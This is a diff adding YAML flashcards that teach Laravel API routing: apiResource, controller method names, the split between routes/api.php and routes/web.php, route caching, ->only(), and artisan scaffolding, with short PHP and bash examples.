+            answer: Route::apiResource('students', StudentsController::class)
+            explanation: >
+              Route::apiResource() binds GET /students → index, POST /students → store, GET /students/{id} → show, PUT
+              /students/{id} → update, and DELETE /students/{id} → destroy. It omits create and edit because those
+              return HTML forms a JSON API never needs.
+            example: |
+              ```php
+              // routes/api.php
+              Route::apiResource('students', StudentsController::class);
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: apply
+          - id: routing-card-02
+            type: name
+            prompt: >
+              Route::resource() registers 7 methods. Route::apiResource() registers only 5. Which two methods does
+              apiResource() drop, and why?
+            answer: create and edit — they return HTML forms, which a JSON API does not need
+            explanation: >
+              create() serves the "new item" HTML form; edit() serves the "edit item" HTML form. Stateless JSON APIs
+              never render forms, so Laravel excludes these two methods when you use apiResource().
+            example: |
+              ```php
+              // web.php — 7 methods including create and edit
+              Route::resource('posts', PostController::class);
+
+              // api.php — 5 methods, no create or edit
+              Route::apiResource('posts', PostController::class);
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: understand
+          - id: routing-card-03
+            type: cloze
+            prompt: >
+              The 5 controller method names bound by Route::apiResource() are: {{index}}, {{store}}, {{show}},
+              {{update}}, and {{destroy}}.
+            answer: index, store, show, update, destroy
+            explanation: >
+              Each name maps to a specific HTTP verb and URL pattern. index = GET /resource; store = POST /resource;
+              show = GET /resource/{id}; update = PUT /resource/{id}; destroy = DELETE /resource/{id}. Memorise the
+              names exactly — Laravel's scaffolding, Sanctum, and form requests all assume this convention.
+            example: |
+              ```php
+              // Generated stub from: php artisan make:controller api/StudentsController --api
+              public function index()   { /* GET /api/students */ }
+              public function store()   { /* POST /api/students */ }
+              public function show()    { /* GET /api/students/{id} */ }
+              public function update()  { /* PUT /api/students/{id} */ }
+              public function destroy() { /* DELETE /api/students/{id} */ }
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: remember
+          - id: routing-card-04
+            type: name
+            prompt: >
+              You add ->middleware(['auth:sanctum']) to a resource route and deploy. Authenticated requests still reach
+              the controller without a token. What is the most likely cause?
+            answer: A stale route cache — run php artisan route:clear
+            explanation: >
+              php artisan route:cache compiles all routes to a single PHP file. Until you clear that file with php
+              artisan route:clear, Laravel serves the cached route table regardless of changes to route files. The
+              middleware addition is correct but invisible until the cache is invalidated.
+            example: |
+              ```bash
+              # After any routing or middleware change:
+              php artisan route:clear
+              # Optional: rebuild cache for production
+              php artisan route:cache
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: apply
+          - id: routing-card-05
+            type: cloze
+            prompt: >
+              API routes live in {{routes/api.php}} and are automatically prefixed with {{/api/}}. Web routes live in
+              {{routes/web.php}} and apply session state and CSRF protection.
+            answer: routes/api.php; /api/; routes/web.php
+            explanation: >
+              Laravel splits routing into two files by middleware group. The api group (routes/api.php) is stateless and
+              rate-limited; every URI is reachable at /api/{uri}. The web group (routes/web.php) uses sessions and
+              cookies. Putting a REST endpoint in web.php will break stateless clients that do not send a CSRF token.
+            example: |
+              ```php
+              // routes/api.php
+              // Accessible at: http://localhost:8888/api/students
+              Route::apiResource('students', StudentsController::class);
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: understand
+          - id: routing-card-06
+            type: predict
+            lang: php
+            prompt: >
+              You run: Route::apiResource('students', StudentsController::class) ->only(['index', 'store']); A client
+              sends DELETE /api/students/5. What does Laravel return?
+            code: |
+              // routes/api.php
+              Route::apiResource('students', StudentsController::class)
+                  ->only(['index', 'store']);
+
+              // Client request:
+              // DELETE /api/students/5
+            answer: 404 Not Found — the destroy route was not registered by ->only(['index', 'store'])
+            explanation: >
+              ->only() whitelists exactly the named controller methods. Any HTTP verb or URL that does not match a
+              registered route returns 404. This is intentional: it prevents accidental exposure of endpoints that have
+              no controller logic.
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: apply
+          - id: routing-card-07
+            type: name
+            prompt: >
+              What Artisan command scaffolds a resource controller bound to a model, omitting the create and edit method
+              stubs?
+            answer: php artisan make:controller api/StudentsController --api --model=Student
+            explanation: >
+              --api tells Artisan to generate only the 5 API method stubs (no create/edit). --model=Student binds route
+              model injection so Laravel automatically resolves the Student model from the {student} route parameter.
+            example: |
+              ```bash
+              php artisan make:controller api/StudentsController --api --model=Student
+              # Generates: app/Http/Controllers/api/StudentsController.php
+              # with stubs: index, store, show, update, destroy
+              ```
+            source: laravel_with_sqlite_API_SCRIPT.docx
+            bloom: apply
